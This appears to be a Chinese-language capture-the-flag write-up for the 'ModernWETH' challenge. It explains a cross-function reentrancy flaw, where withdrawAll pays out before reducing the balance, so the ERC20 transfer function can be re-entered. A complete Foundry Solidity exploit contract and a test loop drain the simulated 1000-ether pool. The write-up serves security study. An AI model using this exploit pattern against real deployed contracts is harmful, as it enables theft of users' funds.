## ModernWETH
这是一道跨函数重入攻击的题，我们知道常见的重入攻击是针对单一函数的，比如取款函数有重入漏洞，我们取款一次后，合约收到转账触发receive函数或者fallback函数再次重入取款函数进行取款。

但是这个题的withdraw和withdrawAll都有防重入的modifire，所以无论是针对单一的进行重入还是说我先调用withdraw，在回调withdrawAll函数都是不可行的，因为他们用的是一样的modifire,详情请回顾一下重入锁的代码。

除了单函数重入，还有两种重入方法，一个是跨函数重入，另一个是跨合约重入。
此题涉及的是跨函数重入，而这个函数不是本合约的代码，而是ERC20里的代码，因为withdrawAll里，call完余额并没有减所以我们还是可以转账，所以有了初步的思路，写一个攻击函数，攻击时转入钱进行deposit，然后withdrawAll，触发攻击函数的回退函数进行转账，转账到whitehat，重复。

### 解题
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
contract Hack{
    ModernWETH public modernWETH;
    
    
    constructor(ModernWETH _add) payable {
        modernWETH = _add;
    }
    
    function hack() external payable {
        modernWETH.deposit{value:msg.value}();
        modernWETH.withdrawAll();
    }

    receive() external payable{
        
        if( address(modernWETH).balance >= 0 ){
            modernWETH.transfer(tx.origin,10 ether);
            }
            payable(tx.origin).transfer(msg.value);
    }
    
    
    
}



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        
        Hack attackcontract = new Hack(modernWETH);
        
        while(address(whitehat).balance < 1010 ether){
            uint amount = address(whitehat).balance <= address(modernWETH).balance 
            ? address(whitehat).balance
            : address(modernWETH).balance;
            attackcontract.hack{value: amount}();
            modernWETH.withdrawAll();
        }
        

        //==================================================//
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}

```
